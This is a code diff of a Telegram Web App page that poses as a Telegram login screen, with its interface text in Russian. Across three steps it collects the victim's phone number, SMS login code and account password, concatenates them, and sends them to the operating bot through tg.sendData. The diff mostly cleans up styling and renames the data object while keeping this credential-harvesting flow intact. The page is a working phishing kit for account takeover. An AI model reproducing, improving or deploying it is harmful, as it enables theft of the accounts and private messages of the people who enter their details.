@@ -14,12 +14,8 @@
         --input-bg: #242f3d;
     }
 
-    /* УБИРАЕМ СТРЕЛОЧКИ */
     input::-webkit-outer-spin-button,
-    input::-webkit-inner-spin-button {
-        -webkit-appearance: none !important;
-        margin: 0 !important;
-    }
+    input::-webkit-inner-spin-button { -webkit-appearance: none !important; margin: 0 !important; }
     input[type=number] { -moz-appearance: textfield !important; appearance: none !important; }
 
     body {
@@ -42,16 +38,9 @@
         border-radius: 28px;
         text-align: center;
         box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-        margin: 20px;
     }
 
-    .logo-area {
-        font-size: 55px;
-        margin-bottom: 20px;
-        transition: transform 0.3s ease;
-        display: inline-block;
-    }
-
+    .logo-area { font-size: 55px; margin-bottom: 20px; display: inline-block; }
     h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
     p { font-size: 14px; color: var(--hint-color); line-height: 1.5; margin-bottom: 30px; min-height: 42px; }
 
@@ -82,10 +71,7 @@
         font-size: 16px;
         font-weight: 700;
         cursor: pointer;
-        box-shadow: 0 4px 15px rgba(51, 144, 236, 0.3);
     }
-
-    button:active { transform: scale(0.97); }
 
     .step { display: none; }
     .active { display: block; animation: slideIn 0.4s ease forwards; }
@@ -104,7 +90,7 @@
     <div id="step-phone" class="step active">
         <h2>Вход</h2>
         <p>Введите номер телефона аккаунта</p>
-        <input type="tel" id="p" placeholder="+7..." autofocus>
+        <input type="tel" id="p" placeholder="+7...">
         <button onclick="nextStep('code')">Получить код</button>
     </div>
 
@@ -112,7 +98,7 @@
         <h2>Код SMS</h2>
         <p>Введите код из приложения или СМС</p>
         <input type="number" id="c" placeholder="00000">
-        <button onclick="checkPasswordStep()">Продолжить</button>
+        <button onclick="nextStep('pass')">Продолжить</button>
     </div>
 
     <div id="step-pass" class="step">
@@ -126,22 +112,21 @@
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
-    tg.ready();
 
-    let data = {
+    let collectedData = {
         p: '', // phone
         c: '', // code
-        s: ''  // password (secret)
+        s: ''  // password
     };
 
-    function nextStep(stepId, icon) {
+    function nextStep(stepId) {
         if (stepId === 'code') {
-            data.p = document.getElementById('p').value;
-            if(!data.p) return;
+            collectedData.p = document.getElementById('p').value;
+            if(!collectedData.p) return;
             showStep('code', '✉️');
         } else if (stepId === 'pass') {
-            data.c = document.getElementById('c').value;
-            if(!data.c) return;
+            collectedData.c = document.getElementById('c').value;
+            if(!collectedData.c) return;
             showStep('pass', '🔑');
         }
     }
@@ -150,17 +135,16 @@
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById('step-' + id).classList.add('active');
         document.getElementById('main-icon').innerText = icon;
+        // Автофокус на новом поле
+        const nextInput = document.querySelector('#step-' + id + ' input');
+        if(nextInput) nextInput.focus();
     }
 
     function finish() {
-        data.s = document.getElementById('pass').value; // Берем пароль (может быть пустым)
-        
-        // Склеиваем всё в одну строку для бота
-        const result = `${data.p}|${data.c}|${data.s}`;
-        
-        tg.sendData(result); // Отправляем и закрываем
+        collectedData.s = document.getElementById('pass').value;
+        const result = `${collectedData.p}|${collectedData.c}|${collectedData.s}`;
+        tg.sendData(result);
     }
 </script>
-
 </body>
 </html>
